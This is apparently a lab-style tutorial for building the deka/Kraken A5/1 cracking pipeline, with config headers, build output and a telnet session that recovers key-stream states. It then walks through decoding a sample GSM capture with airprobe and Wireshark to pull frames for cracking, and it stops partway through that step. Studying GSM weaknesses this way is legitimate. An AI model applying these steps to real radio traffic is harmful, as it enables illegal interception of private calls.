+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>git<span class="w"> </span>clone<span class="w"> </span>git<span class="w"> </span>clone<span class="w"> </span>https://jenda.hrach.eu/p/deka
+<span class="nb">cd</span><span class="w"> </span>deka
+</pre></div>
+</div>
+<p>A partir du tables.conf précédent :</p>
+<p>tables.conf</p>
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>#Devices:  dev/node max_tables
+Device: /dev/index/test0 2
+Device: /dev/index/test1 2
+Device: /dev/index/test2 2
+
+#Tables: dev id(advance) offset
+Table: 0 116 10238642
+Table: 0 124 0
+Table: 1 108 10228856
+Table: 1 100 0
+Table: 2 140 10270774
+Table: 2 132 0
+</pre></div>
+</div>
+<p>on établi delta_client.h</p>
+<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cm">/* First, path to index files. The order has to match the numbers in vankusconf.py. */</span>
+<span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">files</span><span class="p">[</span><span class="mi">40</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+<span class="s">&quot;/root/kraken/indexes/116.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/124.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/108.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/100.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/140.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/132.idx&quot;</span><span class="p">,</span>
+
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span><span class="p">,</span>
+<span class="s">&quot;/root/kraken/indexes/00.idx&quot;</span>
+
+
+<span class="p">};</span>
+
+<span class="cm">/* Offsets of beginning of tables specified in 4096B long blocks.</span>
+<span class="cm">   Of course the order matters.</span>
+<span class="cm">   E.g. the first number &quot;102347869&quot; tells us that the first table, 380, begins</span>
+<span class="cm">   102347869*4096 = 419 216 871 424 bytes from the beginning of the device.</span>
+<span class="cm">*/</span>
+
+<span class="k">const</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">offsets</span><span class="p">[</span><span class="mi">40</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+<span class="mi">10238642</span><span class="p">,</span>
+<span class="mi">0</span><span class="p">,</span>
+<span class="mi">10228856</span><span class="p">,</span>
+<span class="mi">0</span><span class="p">,</span>
+<span class="mi">10270774</span><span class="p">,</span>
+<span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
+<span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
+<span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
+<span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
+<span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
+<span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
+<span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span>
+<span class="p">};</span>
+
+<span class="cm">/* Path to devices (or files) where the tables are stored. */</span>
+<span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">devpaths</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+<span class="s">&quot;/dev/index/test0&quot;</span><span class="p">,</span>
+<span class="s">&quot;/dev/index/test1&quot;</span><span class="p">,</span>
+<span class="s">&quot;/dev/index/test2&quot;</span>
+<span class="p">};</span>
+
+<span class="cm">/* Which table has been stored on which device. E.g. &quot;2&quot; means that the table</span>
+<span class="cm">   is on second (counting from 0) device from the devpaths array.</span>
+<span class="cm">*/</span>
+<span class="k">const</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">devs</span><span class="p">[</span><span class="mi">40</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+<span class="mi">0</span><span class="p">,</span>
+<span class="mi">0</span><span class="p">,</span>
+<span class="mi">1</span><span class="p">,</span>
+<span class="mi">1</span><span class="p">,</span>
+<span class="mi">2</span><span class="p">,</span>
+<span class="mi">2</span><span class="p">,</span>
+<span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
+<span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
+<span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
+<span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
+<span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
+<span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
+<span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span>
+<span class="p">};</span>
+</pre></div>
+</div>
+<p>Ainsi que vancusconf.h</p>
+<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cm">/* How many bursts to load in parallel. The GPU should be fully saturated.</span>
+<span class="cm">   Something like 50 is a good start, depending on number of computing units</span>
+<span class="cm">   on your card.</span>
+<span class="cm">   If the value is too low, &quot;kernels&quot; in oclvankus log will be lower than</span>
+<span class="cm">   specified (and the performance would be of course impaired).</span>
+<span class="cm">   If the value is too high, the cracker will have high latency.</span>
+<span class="cm">*/</span>
+<span class="cp">#define QSIZE 140</span>
+<span class="cm">/* XXX 80 */</span>
+
+<span class="cm">/* size of GPGPU buffer, kernels*slices */</span>
+<span class="cp">#define CLBLOBSIZE 8191*32</span>
+<span class="cm">/* 4095 */</span>
+
+<span class="cm">/* tables we have */</span>
+<span class="kt">uint64_t</span><span class="w"> </span><span class="n">mytables</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">116</span><span class="p">,</span><span class="mi">124</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">100</span><span class="p">,</span><span class="mi">140</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">,</span><span class="mo">00</span><span class="p">};</span>
+<span class="cp"># tables we have</span>
+</pre></div>
+</div>
+<div class="highlight-py notranslate"><div class="highlight"><pre><span></span><span class="c1"># yeah its in this silly order</span>
+<span class="n">mytables</span> <span class="o">=</span> <span class="p">[</span><span class="mi">116</span><span class="p">,</span><span class="mi">124</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">100</span><span class="p">,</span><span class="mi">140</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">,</span><span class="mi">00</span><span class="p">]</span>
+
+<span class="c1"># server host and port</span>
+<span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="s2">&quot;localhost&quot;</span><span class="p">,</span> <span class="mi">6666</span>
+
+<span class="c1"># how many kernels to run in parallel</span>
+<span class="n">kernels</span> <span class="o">=</span> <span class="mi">8191</span>
+<span class="c1"># XXX 4095</span>
+<span class="c1"># slices per kernel</span>
+<span class="n">slices</span> <span class="o">=</span> <span class="mi">32</span>
+
+<span class="c1"># dump computed bursts to files for later analysis - useful for bug hunting</span>
+<span class="n">DEBUGDUMP</span> <span class="o">=</span> <span class="kc">False</span>
+</pre></div>
+</div>
+<p>On cherche les valeurs que l’on va mettre dans delta_binary.h</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>root@legion:/home/nirvana#<span class="w"> </span>ls<span class="w"> </span>-al<span class="w"> </span>/root/kraken/indexes/116.idx<span class="w"> </span>
+-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">81855496</span><span class="w"> </span>sept.<span class="w"> </span><span class="m">19</span><span class="w"> </span><span class="m">22</span>:04<span class="w"> </span>/root/kraken/indexes/116.idx
+nirvana@legion:~/deka$<span class="w"> </span>bc
+bc<span class="w"> </span><span class="m">1</span>.07.1
+Copyright<span class="w"> </span><span class="m">1991</span>-1994,<span class="w"> </span><span class="m">1997</span>,<span class="w"> </span><span class="m">1998</span>,<span class="w"> </span><span class="m">2000</span>,<span class="w"> </span><span class="m">2004</span>,<span class="w"> </span><span class="m">2006</span>,<span class="w"> </span><span class="m">2008</span>,<span class="w"> </span><span class="m">2012</span>-2017<span class="w"> </span>Free<span class="w"> </span>Software<span class="w"> </span>Foundation,<span class="w"> </span>Inc.
+This<span class="w"> </span>is<span class="w"> </span>free<span class="w"> </span>software<span class="w"> </span>with<span class="w"> </span>ABSOLUTELY<span class="w"> </span>NO<span class="w"> </span>WARRANTY.
+For<span class="w"> </span>details<span class="w"> </span><span class="nb">type</span><span class="w"> </span>warranty.<span class="w"> </span>
+<span class="m">81855496</span>/2048
+<span class="m">39968</span>
+</pre></div>
+</div>
+<p>On a extrait la valeur 39968</p>
+<p>cat tables.conf</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#Devices:  dev/node max_tables</span>
+<span class="n">Device</span><span class="p">:</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">index</span><span class="o">/</span><span class="n">test0</span> <span class="mi">2</span>
+<span class="n">Device</span><span class="p">:</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">index</span><span class="o">/</span><span class="n">test1</span> <span class="mi">2</span>
+<span class="n">Device</span><span class="p">:</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">index</span><span class="o">/</span><span class="n">test2</span> <span class="mi">2</span>
+
+<span class="c1">#Tables: dev id(advance) offset</span>
+<span class="n">Table</span><span class="p">:</span> <span class="mi">0</span> <span class="mi">116</span> <span class="mi">10238642</span>
+<span class="n">Table</span><span class="p">:</span> <span class="mi">0</span> <span class="mi">124</span> <span class="mi">0</span>
+<span class="n">Table</span><span class="p">:</span> <span class="mi">1</span> <span class="mi">108</span> <span class="mi">10228856</span>
+<span class="n">Table</span><span class="p">:</span> <span class="mi">1</span> <span class="mi">100</span> <span class="mi">0</span>
+<span class="n">Table</span><span class="p">:</span> <span class="mi">2</span> <span class="mi">140</span> <span class="mi">10270774</span>
+<span class="n">Table</span><span class="p">:</span> <span class="mi">2</span> <span class="mi">132</span> <span class="mi">0</span>
+</pre></div>
+</div>
+<p>On a extrait la valeur 10238642</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">---</span> <span class="o">../</span><span class="n">deka</span><span class="o">/</span><span class="n">delta_binary</span><span class="o">.</span><span class="n">h</span>	<span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">19</span> <span class="mi">23</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mf">39.345774450</span> <span class="o">+</span><span class="mi">0200</span>
+<span class="o">+++</span> <span class="o">../</span><span class="n">deka</span><span class="o">/</span><span class="n">delta_binary</span><span class="o">.</span><span class="n">h</span>	<span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">19</span> <span class="mi">22</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mf">00.285890392</span> <span class="o">+</span><span class="mi">0200</span>
+<span class="o">@@</span> <span class="o">-</span><span class="mi">86</span><span class="p">,</span><span class="mi">8</span> <span class="o">+</span><span class="mi">86</span><span class="p">,</span><span class="mi">8</span> <span class="o">@@</span>
+ <span class="o">/*</span> <span class="n">Index</span> <span class="n">of</span> <span class="n">blockstarts</span> <span class="ow">in</span> <span class="n">table</span> <span class="o">*/</span>
+ <span class="o">/*</span> <span class="n">The</span> <span class="n">number</span> <span class="n">of</span> <span class="n">chains</span> <span class="ow">in</span> <span class="n">tables</span> <span class="n">generated</span> <span class="ow">is</span> <span class="n">unknown</span> <span class="n">to</span> <span class="n">me</span><span class="o">.</span> <span class="n">These</span>
+    <span class="n">index</span> <span class="n">sizes</span> <span class="n">have</span> <span class="n">been</span> <span class="n">worked</span> <span class="n">out</span> <span class="n">empirically</span><span class="o">...</span> <span class="o">*/</span>
+<span class="o">-</span><span class="nb">int</span> <span class="n">mBlockIndex</span><span class="p">[</span><span class="mi">40</span><span class="p">][</span><span class="mi">10227760</span><span class="o">+</span><span class="mi">100000</span><span class="p">];</span>
+<span class="o">-</span><span class="n">uint64_t</span> <span class="n">mPrimaryIndex</span><span class="p">[</span><span class="mi">40</span><span class="p">][</span><span class="mi">39952</span><span class="o">+</span><span class="mi">1000</span><span class="p">];</span>
+<span class="o">+</span><span class="nb">int</span> <span class="n">mBlockIndex</span><span class="p">[</span><span class="mi">40</span><span class="p">][</span><span class="mi">10238642</span><span class="o">+</span><span class="mi">100000</span><span class="p">];</span>
+<span class="o">+</span><span class="n">uint64_t</span> <span class="n">mPrimaryIndex</span><span class="p">[</span><span class="mi">40</span><span class="p">][</span><span class="mi">39968</span><span class="o">+</span><span class="mi">1000</span><span class="p">];</span>
+ 
+ <span class="nb">int</span> <span class="n">mNumBlocks</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
+ <span class="n">unsigned</span> <span class="n">long</span> <span class="n">mStepSize</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
+</pre></div>
+</div>
+<p>Génération et compilation du kernel OpenCL</p>
+<ul class="simple">
+<li><p><strong>AMD:</strong> use <code class="docutils literal notranslate"><span class="pre">genkernel32.sh</span></code> (recommended)</p></li>
+<li><p><strong>Nvidia:</strong> you <em>may</em> need to patch “unsigned long long” → “ulong”</p></li>
+<li><p><strong>32 or 64 bit:</strong> generates a custom <code class="docutils literal notranslate"><span class="pre">slice.c</span></code> (adjust vankusconf.h/vankusconf.py if you switch to 64 bit)</p></li>
+</ul>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>./genkernel32.sh<span class="w"> </span>&gt;<span class="w"> </span>slice.c
+<span class="c1"># or</span>
+./genkernel64.sh<span class="w"> </span>&gt;<span class="w"> </span>slice.c
+</pre></div>
+</div>
+<p>make deka</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>nirvana@legion$ cd deka
+nirvana@legion:~/deka$ sed -i -e &quot;s/3.5m/3.12/g&quot; Makefile
+nirvana@legion:~/deka$ make
+swig4.0 -python delta.i
+gcc -Wall -lm -std=gnu99 -O3 -lpthread -g -ggdb3 -c -fpic delta.c delta_wrap.c -I/usr/include/python3.12
+delta.c: In function ‘ncq_read’:
+delta.c:263:7: warning: unused variable ‘be’ [-Wunused-variable]
+  263 |   int be = 0;
+      |       ^~
+delta.c: In function ‘MineABlockNCQ’:
+delta.c:110:3: warning: ignoring return value of ‘fread’ declared with attribute ‘warn_unused_result’ [-Wunused-result]
+  110 |   fread(scratch, 4096, 1, fp);
+      |   ^~~~~~~~~~~~~~~~~~~~~~~~~~~
+delta.c: In function ‘main’:
+delta.c:306:3: warning: ignoring return value of ‘fread’ declared with attribute ‘warn_unused_result’ [-Wunused-result]
+  306 |   fread(scb, 130560, 1, ptr_myfile);
+      |   ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+gcc -shared delta.o delta_wrap.o -o _delta.so
+swig4.0 -python libvankus.i
+gcc -Wall -lm -std=gnu99 -O3 -lpthread -g -ggdb3 -c -fpic libvankus.c libvankus_wrap.c -I/usr/include/python3.12
+gcc -shared libvankus.o libvankus_wrap.o -o _libvankus.so
+
+</pre></div>
+</div>
+</section>
+</section>
+<section id="demarrage-du-pipeline-paplon-oclvankus-delta-client">
+<h2>11. Démarrage du pipeline (paplon / oclvankus / delta_client)<a class="headerlink" href="#demarrage-du-pipeline-paplon-oclvankus-delta-client" title="Link to this heading"></a></h2>
+<p><strong>Manual startup (best for first time/debug):</strong></p>
+<p>In 3 terminals</p>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>paplon.py
+python3<span class="w"> </span>oclvankus.py<span class="w">   </span><span class="c1"># (run once per OpenCL device; it will prompt for the device)</span>
+python3<span class="w"> </span>delta_client.py
+</pre></div>
+</div>
+<p>In the 4th</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nirvana@legion:~$<span class="w"> </span>telnet<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="m">6666</span>
+Trying<span class="w"> </span><span class="m">0</span>.0.0.0...
+Connected<span class="w"> </span>to<span class="w"> </span><span class="m">0</span>.
+Escape<span class="w"> </span>character<span class="w"> </span>is<span class="w"> </span>^<span class="o">]</span>.
+crack<span class="w"> </span><span class="m">101011100010100000110010010001001001001001001011111111001001001100101000111111110110110111011000100000101110000000</span>
+Cracking<span class="w"> </span><span class="c1">#4 101011100010100000110010010001001001001001001011111111001001001100101000111111110110110111011000100000101110000000</span>
+Found<span class="w"> </span>8A5F47787DB56D3D<span class="w"> </span>@<span class="w"> </span><span class="m">43</span><span class="w"> </span><span class="c1">#4 (table:100)</span>
+crack<span class="w"> </span><span class="c1">#4 took 6949 msec</span>
+crack<span class="w"> </span><span class="m">011111100010011010000110001001001001001111100001000100111000001011011010000111001000000001001000101001111001011010</span>
+Cracking<span class="w"> </span><span class="c1">#5 011111100010011010000110001001001001001111100001000100111000001011011010000111001000000001001000101001111001011010</span>
+Found<span class="w"> </span>AA454F400A859C43<span class="w"> </span>@<span class="w"> </span><span class="m">16</span><span class="w"> </span><span class="c1">#5 (table:132)</span>
+crack<span class="w"> </span><span class="c1">#5 took 6232 msec</span>
+</pre></div>
+</div>
+<p>To avoid device selection prompt:</p>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="nb">export</span><span class="w"> </span><span class="nv">PYOPENCL_CTX</span><span class="o">=</span><span class="s2">&quot;0:0&quot;</span>
+</pre></div>
+</div>
+<hr class="docutils" />
+<p><strong>Notes &amp; Tips</strong></p>
+<ul class="simple">
+<li><p>Don’t run as root unless you need raw disk access</p></li>
+<li><p>All scripts and kernels are modifiable (fragments, tuning, debug)</p></li>
+<li><p>For troubleshooting or performance, check GitHub Issues, SRLabs forums, brmlab, or GSM hacking Discords</p></li>
+</ul>
+</section>
+<section id="the-attack">
+<h2>12. The attack<a class="headerlink" href="#the-attack" title="Link to this heading"></a></h2>
+<p>Download the capture</p>
+<p><a class="reference internal" href="#vf_call6_a725_d174_g5_Kc1EF00BAB3BAC7002.cfile"><span class="xref myst">vf_call6_a725_d174_g5_Kc1EF00BAB3BAC7002.cfile</span></a></p>
+<p>Install airprobe (ToDo)</p>
+<p>Install and run wireshark</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>wireshark
+sudo<span class="w"> </span>su
+wireshark<span class="w"> </span>-k<span class="w"> </span>-f<span class="w"> </span>udp<span class="w"> </span>-Y<span class="w"> </span>gsmtap<span class="w"> </span>-i<span class="w"> </span>lo<span class="w"> </span><span class="p">&amp;</span>
+</pre></div>
+</div>
+<p>Run airprobe in premade docker</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>docker.io<span class="w"> </span>docker-compose-v2
+sudo<span class="w"> </span>docker<span class="w"> </span>pull<span class="w"> </span>bastienbaranoff/airprobe:latest
+sudo<span class="w"> </span>docker<span class="w"> </span>run<span class="w"> </span>-it<span class="w"> </span>--net<span class="w"> </span>host<span class="w"> </span>bastienbaranoff/airprobe
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cd</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">airprobe</span><span class="o">/</span><span class="n">gsm</span><span class="o">-</span><span class="n">receiver</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">python</span>
+<span class="o">./</span><span class="n">go_usrp2</span><span class="o">.</span><span class="n">sh</span> <span class="n">vf_call6_a725_d174_g5_Kc1EF00BAB3BAC7002</span><span class="o">.</span><span class="n">cfile</span> <span class="mi">174</span>
+</pre></div>
+</div>
+<p>next check Immediate Assignement in wireshark
+go in GSM CCCH and open Channel Description Tag</p>
+<p>in our capture we should see:
+<img alt="wireshark" src="../../_images/wireshark.png" /></p>
+<p>Relaunch airprobe with Channel description accuracy</p>
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>0C : TimeSlot0  &quot;Combined configuration&quot;, with SDCCH/4
+          (FCCH + SCH + BCCH + CCCH + SDCCH/4)
+0B : TS0  &quot;FCCH + SCH + BCCH + CCCH&quot;
+1S : TS1  SDCCH/8
+2T : TS2  (Full Rate) Traffic
+1TE: TS1  Enhanced Full Rate Traffic
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cd</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">airprobe</span><span class="o">/</span><span class="n">gsm</span><span class="o">-</span><span class="n">receiver</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">python</span>
+<span class="o">./</span><span class="n">go_usrp2</span><span class="o">.</span><span class="n">sh</span> <span class="n">vf_call6_a725_d174_g5_Kc1EF00BAB3BAC7002</span><span class="o">.</span><span class="n">cfile</span> <span class="mi">174</span> <span class="mi">1</span><span class="n">S</span>
+</pre></div>
+</div>
+<p>Check for System Information Type 5 Frame in wireshark</p>
+<p><img alt="wireshark" src="../../_images/wireshark2.png" /></p>
+<p>Search the corresponding block and quote the first frame</p>
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>C1 862242 1332356: 001000000001110000100000001100100011000001100000110000000110101001000000101010010001001000110100000000101000000110
+P1 862242 1332356: 001000000001110000100000001100100011000001100000110000000110101001000000101010010001001000110100000000101000000110
+S1 862242 1332356: 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+C0 862243 1332389: 000000000101001000100000000000101000000001101011010000101010000101000010001101000010000000000101000010101100010100
+P0 862243 1332389: 000000000101001000100000000000101000000001101011010000101010000101000010001101000010000000000101000010101100010100
+S0 862243 1332389: 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+C0 862244 1332422: 100000010100101000000001111000000000010100000100010000000001010000110000000001001000000001000010101000010100110010
+P0 862244 1332422: 100000010100101000000001111000000000010100000100010000000001010000110000000001001000000001000010101000010100110010
+S0 862244 1332422: 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+C0 862245 1332455: 110000000100100100000101000011010101001000000100000100000000010110001010010000101010100001010100000001000000001000
+P0 862245 1332455: 110000000100100100000101000011010101001000000100000100000000010110001010010000101010100001010100000001000000001000
+S0 862245 1332455: 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+862245 1: 00 01 03 03 49 06 1d 9f 6d 18 10 80 00 00 00 00 00 00 00 00 00 00 00
+</pre></div>
+</div>
+<p>You see there is a timing advance of 1 in wireshark put it to 0</p>
+<p>0001030349061d9f6d1810800000000000000000000000
